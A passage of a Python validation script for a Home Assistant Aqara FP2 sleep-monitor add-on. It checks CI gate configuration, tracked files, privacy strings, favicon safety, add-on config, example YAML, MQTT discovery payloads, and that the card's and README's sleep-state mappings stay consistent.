        "documented local pre-PR gates (" + "; ".join(details) + "). "
        "Intentional new gates belong in CONDUCTOR_GATES in "
        "scripts/validate_repository.py, .github/workflows/ci.yml, "
        "CONTRIBUTING.md, and .github/PULL_REQUEST_TEMPLATE.md."
    )


def conductor_run_commands(text: str) -> list[str]:
    """Return every declared Conductor run command, parsed as real TOML.

    A hand-rolled line parser accepted decoys: text inside a multi-line string
    satisfied the guard even with no `run` key present. tomllib is stdlib on
    every Python this repo targets (CI pins 3.12; the add-on base image is 3.13).
    """

    try:
        settings = tomllib.loads(text)
    except tomllib.TOMLDecodeError as exc:
        fail(f".conductor/settings.toml is not valid TOML: {exc}")

    scripts = settings.get("scripts")
    if not isinstance(scripts, dict):
        fail(".conductor/settings.toml must define a [scripts] table")

    commands = []
    run = scripts.get("run")
    if isinstance(run, str):
        commands.append(run)
    elif isinstance(run, dict):
        # Two table forms are accepted: flat (`[scripts.run] command = "..."`)
        # and named (`[scripts.run.<name>] command = "..."`). Every other shape
        # must fail closed. Silently skipping an unrecognized entry made the
        # "exactly one command" check below count a filtered view, so an extra
        # runnable entry (a non-string command, or a stray key beside a valid
        # `command`) could sit alongside the one validated gate chain.
        for name, entry in sorted(run.items(), key=lambda item: str(item[0])):
            if name == "command":
                if not isinstance(entry, str):
                    fail(
                        ".conductor/settings.toml scripts.run.command must be a string"
                    )
                commands.append(entry)
            elif isinstance(entry, dict):
                command = entry.get("command")
                if not isinstance(command, str):
                    fail(
                        f".conductor/settings.toml scripts.run.{name} must "
                        "define a string command"
                    )
                commands.append(command)
                # args, options.cwd and available_in all change what actually
                # runs (or whether it runs locally at all), so an entry whose
                # command text matches the gate chain is not proof on its own.
                extra_keys = sorted(set(entry) - {"command"}, key=str)
                if extra_keys:
                    fail(
                        f".conductor/settings.toml scripts.run.{name} declares "
                        f"unvalidated key(s) {extra_keys}; args, options and "
                        "available_in change what Conductor actually executes, "
                        "so the gate chain would no longer be what runs"
                    )
            else:
                fail(
                    f".conductor/settings.toml scripts.run.{name} must be a "
                    "table defining a string command"
                )
    elif run is not None:
        fail(".conductor/settings.toml scripts.run must be a string or a table")

    if not commands:
        fail(".conductor/settings.toml must define a validation run command")
    if len(commands) != 1:
        fail(
            ".conductor/settings.toml must define exactly one validation run "
            "command so the checked gate cannot be bypassed"
        )
    return commands


def validate_conductor_settings(text: str | None = None) -> None:
    if text is None:
        path = ROOT / ".conductor/settings.toml"
        if not path.is_file():
            fail(".conductor/settings.toml is missing")
        text = path.read_text(encoding="utf-8")

    # conductor_run_commands() guarantees exactly one command, so the single
    # gate below is the only path: never "any command matches, so pass".
    check_conductor_run_command(conductor_run_commands(text)[0])


def git_tracked_paths() -> list[str]:
    """Return the prospective commit surface: tracked plus non-ignored new files."""

    try:
        result = subprocess.run(
            ["git", "ls-files", "--cached", "--others", "--exclude-standard", "-z"],
            cwd=ROOT,
            capture_output=True,
            text=True,
            check=False,
        )
    except OSError as exc:
        fail(f"unable to list repository candidate paths: {exc}")
    if result.returncode:
        detail = result.stderr.strip() or f"git exited with {result.returncode}"
        fail(f"unable to list repository candidate paths: {detail}")
    return [path for path in result.stdout.split("\0") if path]


def validate_tracked_paths(paths=None) -> None:
    tracked = sorted(set(git_tracked_paths() if paths is None else paths))
    tracked_set = set(tracked)
    published: dict[str, set[str]] = {}
    violations = []

    for rel in tracked:
        path = PurePosixPath(rel)
        parts = path.parts

        if path.name == ".DS_Store":
            violations.append(f"{rel}: .DS_Store must not be tracked")

        if parts and parts[0] == ".gstack":
            violations.append(
                f"{rel}: .gstack/ is generated local state and must not be tracked"
            )

        if parts and parts[0] == "videos":
            generated_dirs = {"renders", "snapshots"}.intersection(parts[1:])
            if generated_dirs:
                directory = sorted(generated_dirs)[0]
                violations.append(
                    f"{rel}: videos/**/{directory}/ artifacts must not be tracked"
                )
            if path.name == "VERIFICATION.md":
                violations.append(
                    f"{rel}: videos/**/VERIFICATION.md receipts must not be tracked"
                )
            if rel == "videos/gif-batch-verification.json":
                violations.append(
                    f"{rel}: generated batch verification must not be tracked"
                )

        suffix = path.suffix.lower()
        if suffix not in {".gif", ".mp4"}:
            continue
        if parts[:2] != ("assets", "feature-gifs") or len(parts) < 3:
            violations.append(
                f"{rel}: tracked GIF/MP4 binaries belong under assets/feature-gifs/"
            )
            continue

        published_path = PurePosixPath(*parts[2:])
        published_stem = published_path.with_suffix("").as_posix()
        published.setdefault(published_stem, set()).add(suffix)

    for published_stem, suffixes in sorted(published.items()):
        missing = sorted({".gif", ".mp4"} - suffixes)
        if missing:
            violations.append(
                f"assets/feature-gifs/{published_stem}: missing published "
                + " and ".join(missing)
            )

        source_stem = PurePosixPath(published_stem).name
        source_prefix = f"videos/{source_stem}/"
        if not any(rel.startswith(source_prefix) for rel in tracked_set):
            violations.append(
                f"assets/feature-gifs/{published_stem}: missing tracked source "
                f"under videos/{source_stem}/"
            )

    if violations:
        fail(
            "tracked repository path validation failed:\n"
            + "\n".join(f"  - {violation}" for violation in violations)
        )


def iter_text_files():
    for path in ROOT.rglob("*"):
        if any(part in SKIP_DIRS for part in path.parts):
            continue
        if not path.is_file():
            continue
        if path == Path(__file__).resolve():
            continue
        if path.name == "Dockerfile" or path.suffix in TEXT_SUFFIXES:
            yield path


def private_string_matches(rel: str, text: str) -> list[str]:
    matches = []
    for label, pattern in PRIVATE_PATTERNS.items():
        if pattern.search(text):
            matches.append(label)
    return matches


def check_private_strings_in_text(rel: str, text: str) -> None:
    matches = private_string_matches(rel, text)
    if matches:
        fail(f"{rel}: matched private strings: " + ", ".join(sorted(matches)))


def scan_private_strings() -> None:
    errors = []
    for path in ROOT.rglob(".env"):
        errors.append(
            f"{path.relative_to(ROOT)}: environment file must not be included"
        )
    for path in iter_text_files():
        rel = path.relative_to(ROOT)
        text = path.read_text(encoding="utf-8")
        for label in private_string_matches(str(rel), text):
            errors.append(f"{rel}: matched {label}")
    if errors:
        fail("privacy scan failed:\n" + "\n".join(f"  - {err}" for err in errors))


def validate_yaml() -> None:
    for rel in [
        "repository.yaml",
        "aqara_fp2_sleep/config.yaml",
        "examples/sleep_tracking.yaml",
        "examples/dashboard-sleep.yaml",
        "examples/automations.yaml",
        "examples/recorder.yaml",
    ]:
        path = ROOT / rel
        with path.open() as handle:
            yaml.safe_load(handle)


def check_favicon(source: bytes, favicon: bytes) -> None:
    if favicon != source:
        fail(f"{FAVICON_PATH} must match {FAVICON_SOURCE} exactly")

    try:
        root = ET.fromstring(favicon)
    except ET.ParseError as exc:
        fail(f"{FAVICON_PATH} must be valid SVG XML: {exc}")

    if root.tag != "{http://www.w3.org/2000/svg}svg":
        fail(f"{FAVICON_PATH} must use the SVG root element")
    if root.get("viewBox") != FAVICON_VIEW_BOX:
        fail(f"{FAVICON_PATH} must use viewBox {FAVICON_VIEW_BOX!r}")

    favicon_text = favicon.decode("utf-8")
    if "@import" in favicon_text:
        fail(f"{FAVICON_PATH} must not load external styles or assets")
    for reference in re.findall(r"url\(\s*['\"]?([^'\")\s]+)", favicon_text):
        if not reference.startswith("#"):
            fail(f"{FAVICON_PATH} must not load external styles or assets")

    for element in root.iter():
        tag = element.tag.rsplit("}", 1)[-1]
        if tag in {"image", "script", "foreignObject"}:
            fail(f"{FAVICON_PATH} must not embed external content")
        for attribute, value in element.attrib.items():
            name = attribute.rsplit("}", 1)[-1]
            if name in {"href", "src"} and not value.startswith("#"):
                fail(f"{FAVICON_PATH} must not reference external assets")


def validate_favicon() -> None:
    source_path = ROOT / FAVICON_SOURCE
    favicon_path = ROOT / FAVICON_PATH
    if not source_path.is_file():
        fail(f"{FAVICON_SOURCE} is missing")
    if not favicon_path.is_file():
        fail(f"{FAVICON_PATH} is missing")
    check_favicon(source_path.read_bytes(), favicon_path.read_bytes())


def validate_addon_config(config=None) -> None:
    if config is None:
        config = yaml.safe_load((ROOT / "aqara_fp2_sleep/config.yaml").read_text())
    required = {"name", "version", "slug", "description", "arch", "options", "schema"}
    missing = sorted(required - set(config))
    if missing:
        fail(f"add-on config missing required keys: {', '.join(missing)}")

    watchdog = config.get("watchdog")
    if watchdog is not None:
        if not isinstance(watchdog, str) or not WATCHDOG_URL_PATTERN.match(watchdog):
            fail(
                "add-on watchdog must be a health-check URL string, not a "
                "boolean restart toggle"
            )

    options = config["options"]
    schema = config["schema"]
    if set(options) != set(schema):
        fail("add-on options and schema keys differ")

    if options["subject_id"] != "":
        fail("subject_id default must be blank")
    if options["aqara_username"] != "" or options["aqara_password"] != "":
        fail("Aqara credential defaults must be blank")
    if options["mqtt_node_id"] != "aqara_fp2_sleep":
        fail("mqtt_node_id default changed unexpectedly")

    # Supervisor reads the per-add-on CHANGELOG.md (not the repo-root one) to
    # render the "what's new" changelog in the add-on store UI, and shows
    # "no changelog found" if it's missing or doesn't cover the current
    # version — see aqara_fp2_sleep/CHANGELOG.md.
    addon_changelog = ROOT / "aqara_fp2_sleep/CHANGELOG.md"
    if not addon_changelog.exists():
        fail(
            "aqara_fp2_sleep/CHANGELOG.md is missing (Supervisor reads this, not the repo-root CHANGELOG.md)"
        )
    version = config["version"]
    if f"## {version}" not in addon_changelog.read_text():
        fail(
            f"aqara_fp2_sleep/CHANGELOG.md has no entry for the current version {version}"
        )


def validate_run_script(text=None) -> None:
    if text is None:
        text = (ROOT / "aqara_fp2_sleep/run.sh").read_text()
    if "bashio::exit.nok" in text:
        fail(
            "aqara_fp2_sleep/run.sh must slow-exit via startup_failure(), "
            "not bashio::exit.nok"
        )
    expected_cooldown = (
        'export STARTUP_FAILURE_COOLDOWN="${STARTUP_FAILURE_COOLDOWN:-30}"'
    )
    if expected_cooldown not in text:
        fail(
            "aqara_fp2_sleep/run.sh must export STARTUP_FAILURE_COOLDOWN with "
            "the canonical 30s default for Python"
        )
    if (
        "startup_failure()" not in text
        or 'sleep "${STARTUP_FAILURE_COOLDOWN}" &' not in text
    ):
        fail(
            "aqara_fp2_sleep/run.sh is missing the interruptible startup_failure helper"
        )
    if 'trap \'kill "${sleep_pid}"' not in text:
        fail("aqara_fp2_sleep/run.sh startup_failure sleep must be interruptible")
    for message in [
        "No MQTT service available",
        "aqara_username and aqara_password are required.",
        "subject_id is required.",
    ]:
        if f'startup_failure "{message}' not in text:
            fail(f"aqara_fp2_sleep/run.sh does not slow-exit for: {message}")


def validate_examples() -> None:
    examples = list((ROOT / "examples").glob("*.yaml"))
    if not examples:
        fail("no example YAML files found")
    # These examples are wired to the add-on's default sensor IDs and the
    # documented neutral occupancy boundary. Automations still require
    # PLACEHOLDER_ values for user-specific devices.
    fully_wired = {"recorder.yaml", "sleep_tracking.yaml", "dashboard-sleep.yaml"}
    # Allow the add-on's own entities (aqara_fp2_sleep_*) and the example
    # template helpers defined in sleep_tracking.yaml (fp2_*). Any other real
    # entity ID in a common domain is a foreign/private entity that must be a
    # PLACEHOLDER instead. Service calls (service: light.turn_on) share the
    # domain.name shape, so lines invoking services are skipped.
    entity_domains = (
        "sensor|binary_sensor|light|switch|climate|vacuum|lock|cover|"
        "media_player|camera|fan|humidifier|number|select|person|"
        "device_tracker|input_[a-z]+"
    )
    entity_id = re.compile(rf"\b(?:{entity_domains})\.[a-z0-9_]+")
    service_line = re.compile(r"^\s*(?:-\s*)?(?:service|action):")
    for path in examples:
        text = path.read_text()
        if path.name not in fully_wired and "PLACEHOLDER_" not in text:
            fail(f"{path.relative_to(ROOT)} must use PLACEHOLDER_* entity IDs")
        for line in text.splitlines():
            if service_line.match(line):
                continue
            for match in entity_id.finditer(line):
                value = match.group(0)
                object_id = value.split(".", 1)[1]
                if value == OCCUPANCY_ENTITY or object_id.startswith(
                    ("aqara_fp2_sleep_", "fp2_")
                ):
                    continue
                fail(
                    f"{path.relative_to(ROOT)} contains a non-placeholder "
                    f"entity id {value}: {line.strip()}"
                )


def validate_discovery_payloads() -> None:
    install_import_stubs()
    module_path = ROOT / "aqara_fp2_sleep/aqara_fp2_sleep_poller.py"
    spec = importlib.util.spec_from_file_location("poller", module_path)
    if spec is None or spec.loader is None:
        fail("could not load poller module")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)

    if module.NODE != "aqara_fp2_sleep":
        fail(f"unexpected default MQTT node id: {module.NODE}")
    if module.DEVICE["name"] != "Aqara FP2 Sleep Monitor":
        fail("unexpected default device name")

    object_ids = []
    default_entity_ids = []
    for sensor in module.SENSORS:
        payload = module.discovery_payload(*sensor)
        json.dumps(payload)
        object_ids.append(payload["object_id"])
        if "default_entity_id" not in payload:
            fail(
                "discovery payload missing default_entity_id (required for HA ≥2026.4)"
            )
        default_entity_ids.append(payload["default_entity_id"])
        if "Schlafzimmer" in json.dumps(payload) or "Bett" in json.dumps(payload):
            fail("discovery payload contains private/local naming")
        if payload.get("force_update") is not True:
            fail(
                "discovery payload missing force_update: true (needed so the "
                "SleepRadar Card's last_updated-based stale badge doesn't "
                "false-positive on unchanged readings)"
            )

    expected = EXPECTED_OBJECT_IDS
    if set(object_ids) != expected:
        fail(f"unexpected discovery object ids: {sorted(object_ids)}")
    expected_entity_ids = {f"sensor.{oid}" for oid in expected}
    if set(default_entity_ids) != expected_entity_ids:
        fail(f"unexpected discovery default_entity_ids: {sorted(default_entity_ids)}")

    problem_entity_id = f"binary_sensor.{module.PROBLEM_OBJECT_ID}"
    validate_card_default_entities(
        module.NODE, expected_entity_ids, problem_entity_id
    )
    check_recorder_entities(
        (ROOT / "examples/recorder.yaml").read_text(),
        expected_entity_ids,
        problem_entity_id,
    )


def validate_card_default_entities(
    poller_node_id, published_entity_ids, published_problem_entity_id
) -> None:
    """The card's default entities must be a subset of what the add-on
    actually publishes, using the same default mqtt_node_id."""
    card_path = ROOT / "card/sleepradar-card.js"
    if not card_path.exists():
        fail("card/sleepradar-card.js is missing")
    text = card_path.read_text()

    node_match = re.search(r'DEFAULT_NODE_ID\s*=\s*"([^"]+)"', text)
    if not node_match:
        fail("card/sleepradar-card.js: could not find DEFAULT_NODE_ID")
    card_node_id = node_match.group(1)
    if card_node_id != poller_node_id:
        fail(
            f"card DEFAULT_NODE_ID ({card_node_id!r}) does not match the "
            f"add-on's default mqtt_node_id ({poller_node_id!r})"
        )

    suffixes_match = re.search(r"ENTITY_SUFFIXES\s*=\s*\{(.*?)\}", text, re.DOTALL)
    if not suffixes_match:
        fail("card/sleepradar-card.js: could not find ENTITY_SUFFIXES")
    suffixes = re.findall(
        r'["\']?([A-Za-z0-9_]+)["\']?\s*:\s*"([^"]+)"', suffixes_match.group(1)
    )
    if not suffixes:
        fail("card/sleepradar-card.js: ENTITY_SUFFIXES has no entries")

    card_entity_ids = {f"sensor.{card_node_id}_{suffix}" for _, suffix in suffixes}
    unpublished = card_entity_ids - published_entity_ids
    if unpublished:
        fail(
            "card/sleepradar-card.js references default entities the add-on "
            f"does not publish: {sorted(unpublished)}"
        )

    # The diagnostic entity is not in ENTITY_SUFFIXES (it is a binary_sensor,
    # not a vitals sensor), so it needs its own drift check. Without one, a
    # rename on either side degrades the card back to the generic "no data
    # yet" text with nothing failing.
    problem_match = re.search(r'PROBLEM_SUFFIX\s*=\s*"([^"]+)"', text)
    if not problem_match:
        fail("card/sleepradar-card.js: could not find PROBLEM_SUFFIX")
    if "binary_sensor.${nodeId}_${PROBLEM_SUFFIX}" not in text:
        fail(
            "card/sleepradar-card.js must build its diagnostic entity id as "
            "binary_sensor.${nodeId}_${PROBLEM_SUFFIX}"
        )
    card_problem_entity = f"binary_sensor.{card_node_id}_{problem_match.group(1)}"
    if card_problem_entity != published_problem_entity_id:
        fail(
            f"card diagnostic entity ({card_problem_entity!r}) does not match "
            f"the one the add-on publishes ({published_problem_entity_id!r})"
        )


def install_import_stubs() -> None:
    """Allow static payload checks without installing runtime-only packages."""
    if "paho.mqtt.client" not in sys.modules:
        paho = types.ModuleType("paho")
        paho_mqtt = types.ModuleType("paho.mqtt")
        paho_client = types.ModuleType("paho.mqtt.client")
        paho_client.CallbackAPIVersion = types.SimpleNamespace(VERSION2=object())
        paho_client.Client = object
        sys.modules["paho"] = paho
        sys.modules["paho.mqtt"] = paho_mqtt
        sys.modules["paho.mqtt.client"] = paho_client

    if "Crypto.PublicKey.RSA" not in sys.modules:
        crypto = types.ModuleType("Crypto")
        crypto_public_key = types.ModuleType("Crypto.PublicKey")
        crypto_rsa = types.ModuleType("Crypto.PublicKey.RSA")
        crypto_hash = types.ModuleType("Crypto.Hash")
        crypto_md5 = types.ModuleType("Crypto.Hash.MD5")
        crypto_cipher = types.ModuleType("Crypto.Cipher")
        crypto_pkcs = types.ModuleType("Crypto.Cipher.PKCS1_v1_5")

        crypto_rsa.importKey = lambda key: key
        crypto_md5.new = lambda value: types.SimpleNamespace(hexdigest=lambda: "")
        crypto_pkcs.new = lambda key: types.SimpleNamespace(encrypt=lambda value: b"")

        sys.modules["Crypto"] = crypto
        sys.modules["Crypto.PublicKey"] = crypto_public_key
        sys.modules["Crypto.PublicKey.RSA"] = crypto_rsa
        sys.modules["Crypto.Hash"] = crypto_hash
        sys.modules["Crypto.Hash.MD5"] = crypto_md5
        sys.modules["Crypto.Cipher"] = crypto_cipher
        sys.modules["Crypto.Cipher.PKCS1_v1_5"] = crypto_pkcs


def load_poller_module(name: str):
    """Import a fresh copy of the poller under `name`.

    Fresh per call so module-level monkeypatching in one check cannot leak
    into the next. Anything a check patches on a *shared* object (the stubbed
    paho module, the real urllib) still has to be restored by that check.
    """
    install_import_stubs()
    module_path = ROOT / "aqara_fp2_sleep/aqara_fp2_sleep_poller.py"
    spec = importlib.util.spec_from_file_location(name, module_path)
    if spec is None or spec.loader is None:
        fail(f"could not load poller module for {name}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _code_label_pairs(block: str) -> dict:
    return {
        int(code): label
        for code, label in re.findall(r"(\d+)\s*:\s*['\"]([^'\"]+)['\"]", block)
    }


def _int_list(fragment: str) -> list:
    return [int(n) for n in re.findall(r"\d+", fragment)]


def check_ghost_vitals_evidence(fixture_text: str, readme_text: str) -> None:
    check_private_strings_in_text(GHOST_VITALS_FIXTURE, fixture_text)
    if re.search(r"\b20\d{2}-\d{2}-\d{2}(?:[T ][0-9:.+-Z]+)?\b", fixture_text):
        fail(f"{GHOST_VITALS_FIXTURE} must not contain absolute timestamps")
    if re.search(
        r"\b(?:sensor|binary_sensor|device_tracker|person)\.[a-z0-9_]+\b",
        fixture_text,
    ):
        fail(f"{GHOST_VITALS_FIXTURE} must not contain Home Assistant entity IDs")

    try:
        data = json.loads(fixture_text)
    except json.JSONDecodeError as exc:
        fail(f"{GHOST_VITALS_FIXTURE} must be valid JSON: {exc}")
    if not isinstance(data, dict):
        fail(f"{GHOST_VITALS_FIXTURE} root must be an object")
    if data.get("schema_version") != 1:
        fail(f"{GHOST_VITALS_FIXTURE} schema_version must be 1")
    if data.get("evidence_kind") != "sanitized_aggregate":
        fail(f"{GHOST_VITALS_FIXTURE} must remain a sanitized aggregate")

    window = data.get("window")
    if not isinstance(window, dict):
        fail(f"{GHOST_VITALS_FIXTURE} window must be an object")
    if (
        window.get("approximate_duration_minutes")
        != GHOST_VITALS_AGGREGATES["window_minutes"]
    ):
        fail(f"{GHOST_VITALS_FIXTURE} window duration drifted")
    if window.get("absolute_timestamps_included") is not False:
        fail(f"{GHOST_VITALS_FIXTURE} must explicitly exclude absolute timestamps")

    occupancy = data.get("occupancy")
    if occupancy != {
        "source_kind": "independent_binary_sensor",
        "continuous_state": "empty",
    }:
        fail(f"{GHOST_VITALS_FIXTURE} occupancy aggregate drifted: {occupancy!r}")

    sleep_state = data.get("sleep_state")
    if not isinstance(sleep_state, dict):
        fail(f"{GHOST_VITALS_FIXTURE} sleep_state must be an object")
    if sleep_state.get("reported_codes") != [4, 5, 3]:
        fail(f"{GHOST_VITALS_FIXTURE} sleep-state sequence must be [4, 5, 3]")
    if (
        sleep_state.get("update_events")
        != GHOST_VITALS_AGGREGATES["sleep_state_update_events"]
    ):
        fail(f"{GHOST_VITALS_FIXTURE} sleep-state event count drifted")
    if sleep_state.get("interpretation") != "indicative_only":
        fail(f"{GHOST_VITALS_FIXTURE} stages must remain indicative only")

    heart_rate = data.get("heart_rate")
    if not isinstance(heart_rate, dict):
        fail(f"{GHOST_VITALS_FIXTURE} heart_rate must be an object")
    expected_heart_rate = {
        "update_events": GHOST_VITALS_AGGREGATES["heart_rate_update_events"],
        "value_runs": GHOST_VITALS_AGGREGATES["heart_rate_value_runs"],
        "transitions_after_initial_sample": GHOST_VITALS_AGGREGATES[
            "heart_rate_transitions"
        ],
        "distinct_values": GHOST_VITALS_AGGREGATES["heart_rate_distinct_values"],
        "minimum_bpm": GHOST_VITALS_AGGREGATES["heart_rate_minimum_bpm"],
        "maximum_bpm": GHOST_VITALS_AGGREGATES["heart_rate_maximum_bpm"],
    }
    if heart_rate != expected_heart_rate:
        fail(f"{GHOST_VITALS_FIXTURE} heart-rate aggregate drifted: {heart_rate!r}")

    recorder_note = data.get("recorder_note")
    if not isinstance(recorder_note, str) or not (
        "force_update" in recorder_note
        and re.search(r"\b(?:duplicate|repeated)\b", recorder_note, re.IGNORECASE)
    ):
        fail(f"{GHOST_VITALS_FIXTURE} must explain force_update duplicate events")

    section = re.search(
        r"## Sleep State Codes(.*?)(?:\n## |\Z)", readme_text, re.DOTALL
    )
    if not section:
        fail("README.md: could not find evidence-compatible Sleep State Codes section")
    evidence_text = section.group(1)
    required_tokens = [
        GHOST_VITALS_FIXTURE,
        "300",
        "301",
        "27",
        "17",
        "50",
        "77",
        "force_update",
    ]
    missing = [token for token in required_tokens if token not in evidence_text]
    if missing:
        fail(
            "README.md ghost-vitals evidence contract is missing: " + ", ".join(missing)
        )


def validate_ghost_vitals_evidence() -> None:
    fixture = (ROOT / GHOST_VITALS_FIXTURE).read_text(encoding="utf-8")
    readme = (ROOT / "README.md").read_text(encoding="utf-8")
    check_ghost_vitals_evidence(fixture, readme)


def strip_js_comments(text: str) -> str:
    """Drop JS comments so source-text guards cannot be satisfied by prose.

    Only comments are removed, never string literals: several guarded fragments
    are themselves string literals (e.g. `return "In bed - stage unknown";`).
    The `(?<!:)` guard keeps `https://` inside a URL from being treated as the
    start of a line comment.
    """

    without_blocks = re.sub(r"/\*.*?\*/", "", text, flags=re.DOTALL)
    return re.sub(r"(?<!:)//[^\n]*", "", without_blocks)


def check_card_phase_semantics(text: str) -> None:
    block = re.search(r"const PHASES\s*=\s*\{(.*?)\}", text, re.DOTALL)
    if not block:
        fail("card/sleepradar-card.js: could not find the PHASES map")
    phases = _code_label_pairs(block.group(1))
    if phases != LEGACY_UNGATED_PHASES:
        fail(
            "card/sleepradar-card.js legacy ungated PHASES drifted from "
            f"published behavior: {phases}"
        )

    in_bed = re.search(r"IN_BED_SLEEP_CODES\s*=\s*new Set\(\[([^\]]*)\]\)", text)
    if not in_bed:
        fail("card/sleepradar-card.js: could not find IN_BED_SLEEP_CODES")
    if set(_int_list(in_bed.group(1))) != set(IN_BED_CODES):
        fail(
            "card/sleepradar-card.js IN_BED_SLEEP_CODES drifted: "
            f"{sorted(_int_list(in_bed.group(1)))}"
        )

    gated_contract = {
        "occupied code 0": ('if (occupancyConfirmed && code === 0) return "In bed";'),
        "occupied codes 1/2": 'return "In bed — stage unknown";',
        "direct self-reference rejection": (
            "if (Object.values(this._entityIds).includes(entity))"
        ),
        "non-string override rejection": 'if (typeof override !== "string")',
        "occupied_states cannot span both binary states": (
            'normalizedStates.includes("on") && normalizedStates.includes("off")'
        ),
    }
    # Matched against comment-stripped source. A bare substring search over the
    # raw file passes when the expected text sits in a comment while the real
    # logic is gutted -- the contract this guard exists to enforce could be
    # deleted with CI staying green. Executable behavior is pinned separately by
    # tests/sleepradar-card.test.js; this check is drift detection on top.
    executable = strip_js_comments(text)
    missing = [
        label
        for label, fragment in gated_contract.items()
        if fragment not in executable
    ]
    if missing:
        fail(
            "card/sleepradar-card.js gated occupancy contract is missing: "
            + ", ".join(missing)
        )


def check_readme_phase_table(text: str) -> None:
    section = re.search(r"## Sleep State Codes(.*?)(?:\n## |\Z)", text, re.DOTALL)
    if not section:
        fail("README.md: could not find the '## Sleep State Codes' section")
    # The table has two data columns and BOTH are contracts. Validating only the
    # last one let the legacy column drift away from the card's PHASES map with
    # CI green, so the legacy column is now pinned to its machine-checkable
    # source instead of being documentation nobody checks.
    expected_gated = dict(LEGACY_UNGATED_PHASES)
    expected_gated.update(
        {
            0: "In bed; not measuring",
            1: "In bed — stage unknown",
            2: "In bed — stage unknown",
        }
    )
    parsed_legacy = {}
    parsed_gated = {}
    for line in section.group(1).splitlines():
        if not line.strip().startswith("|"):
            continue
        cells = [c.strip() for c in line.strip().strip("|").split("|")]
        code_match = re.fullmatch(r"`(\d+)`", cells[0]) if cells else None
        if not code_match:
            continue
        if len(cells) != 3:
            fail(
                "README.md Sleep State Codes table must have a code column, a "
                f"legacy column, and a gated column: {cells}"
            )
        parsed_legacy[int(code_match.group(1))] = cells[1]
        parsed_gated[int(code_match.group(1))] = cells[2]
    if parsed_legacy != LEGACY_UNGATED_PHASES:
        fail(
            "README.md legacy Sleep State Codes column drifted from the card's "
            f"PHASES map: {parsed_legacy}"
        )
    if parsed_gated != expected_gated:
        fail(
            "README.md gated Sleep State Codes column drifted from "
            f"published behavior: {parsed_gated}"
        )


def check_sleep_tracking_maps(text: str) -> None:
    phases_block = re.search(r"phases\s*=\s*\{(.*?)\}", text, re.DOTALL)
    if not phases_block:
        fail("examples/sleep_tracking.yaml: could not find the `phases` map")
    phases = _code_label_pairs(phases_block.group(1))
    if phases != INDICATIVE_PHASES:
        fail(f"examples/sleep_tracking.yaml `phases` map drifted: {phases}")

    names_block = re.search(r"names\s*=\s*\{(.*?)\}", text, re.DOTALL)
    if not names_block:
        fail("examples/sleep_tracking.yaml: could not find the `names` map")
    names = _code_label_pairs(names_block.group(1))
    if names != INDICATIVE_PHASES:
        fail(
            "examples/sleep_tracking.yaml `names` must contain only indicative "
            f"codes 3-5: {names}"
        )

    data = yaml.safe_load(text)
    if not isinstance(data, list):
        fail("examples/sleep_tracking.yaml must contain a list of template groups")
    sensor_entries = {}
    binary_sensor_entries = {}
    for group in data:
        if not isinstance(group, dict):
            continue
        for item in group.get("sensor") or []:
            if isinstance(item, dict):
                sensor_entries[item.get("name")] = item
        for item in group.get("binary_sensor") or []:
            if isinstance(item, dict):
                binary_sensor_entries[item.get("name")] = item
    phase = sensor_entries.get("FP2 Sleep Phase")
    now = sensor_entries.get("FP2 Sleep Now")
    asleep = binary_sensor_entries.get("FP2 Asleep")
    if not all(isinstance(item, dict) for item in [phase, now, asleep]):
        fail(
            "examples/sleep_tracking.yaml must define FP2 Sleep Phase, "
            "FP2 Sleep Now, and FP2 Asleep"
        )

    phase_state = phase.get("state", "")
    now_state = now.get("state", "")
    asleep_state = asleep.get("state", "")
    for name, template in [
        ("FP2 Sleep Phase", phase_state),
        ("FP2 Sleep Now", now_state),
    ]:
        if "occupancy == 'off'" not in template or "occupancy == 'on'" not in template:
            fail(f"examples/sleep_tracking.yaml {name} is not occupancy-gated")
        if "In bed — stage unknown" not in template:
            fail(
                f"examples/sleep_tracking.yaml {name} must not assign codes "
                "0-2 an occupied stage"
            )
    if "occupancy == 'on' and code in [3, 4, 5]" not in now_state:
        fail(
            "examples/sleep_tracking.yaml FP2 Sleep Now must gate indicative "
            "stages and vitals on occupancy"
        )
    if "occupancy == 'on' and code in [3, 4, 5]" not in asleep_state:
        fail(
            "examples/sleep_tracking.yaml FP2 Asleep must require occupancy "
            "and an indicative code 3-5"
        )

    for name, item in [
        ("FP2 Sleep Phase", phase),
        ("FP2 Sleep Now", now),
        ("FP2 Asleep", asleep),
    ]:
        state = item.get("state", "")
        availability = item.get("availability", "")
        if normalize_template(state) != EXPECTED_SLEEP_TEMPLATE_STATES[name]:
            fail(
                f"examples/sleep_tracking.yaml {name} state drifted from the "
                "fail-closed occupancy contract"
            )
        if normalize_template(availability) != EXPECTED_SLEEP_TEMPLATE_AVAILABILITY:
            fail(
                f"examples/sleep_tracking.yaml {name} availability drifted "
                "from the fail-closed occupancy contract"
            )
        combined = f"{state}\n{availability}"
        if f"states('{OCCUPANCY_ENTITY}')" not in combined:
            fail(f"examples/sleep_tracking.yaml {name} uses no independent gate")
        if (
            "occupancy in ['on', 'off']" not in availability
            or "occupancy == 'off'" not in availability
        ):
            fail(f"examples/sleep_tracking.yaml {name} does not fail closed")


def check_dashboard_maps(text: str) -> None:
    dashboard = yaml.safe_load(text)
    if not isinstance(dashboard, list):
        fail("examples/dashboard-sleep.yaml must contain a list of views")

    now_sections = []
    for view in dashboard:
        if not isinstance(view, dict):
            continue
        for section in view.get("sections") or []:
            if not isinstance(section, dict):
                continue
            cards = section.get("cards") or []
            if any(
                isinstance(card, dict)
                and card.get("type") == "heading"
                and card.get("heading") == "Now"
                for card in cards
            ):
                now_sections.append(cards)

    if len(now_sections) != 1:
        fail("examples/dashboard-sleep.yaml must contain exactly one `Now` section")
    now_cards = [
        card
        for card in now_sections[0]
        if isinstance(card, dict) and card.get("type") != "heading"
    ]
    if [card.get("type") for card in now_cards] != ["custom:sleepradar-card"]:
        fail(
            "examples/dashboard-sleep.yaml `Now` must contain exactly one "
            "custom:sleepradar-card and no duplicate live cards"
        )
    bed_occupancy = now_cards[0].get("bed_occupancy")
    if bed_occupancy != {
        "entity": OCCUPANCY_ENTITY,
        "occupied_states": ["on"],
    }:
        fail(
            "examples/dashboard-sleep.yaml live card must use the neutral "
            f"fail-closed occupancy gate {OCCUPANCY_ENTITY}"
        )

    apex = re.search(r"const phases\s*=\s*\{([^}]*)\}", text)
    if not apex:
        fail("examples/dashboard-sleep.yaml: could not find the ApexCharts phases map")
    apex_map = _code_label_pairs(apex.group(1))
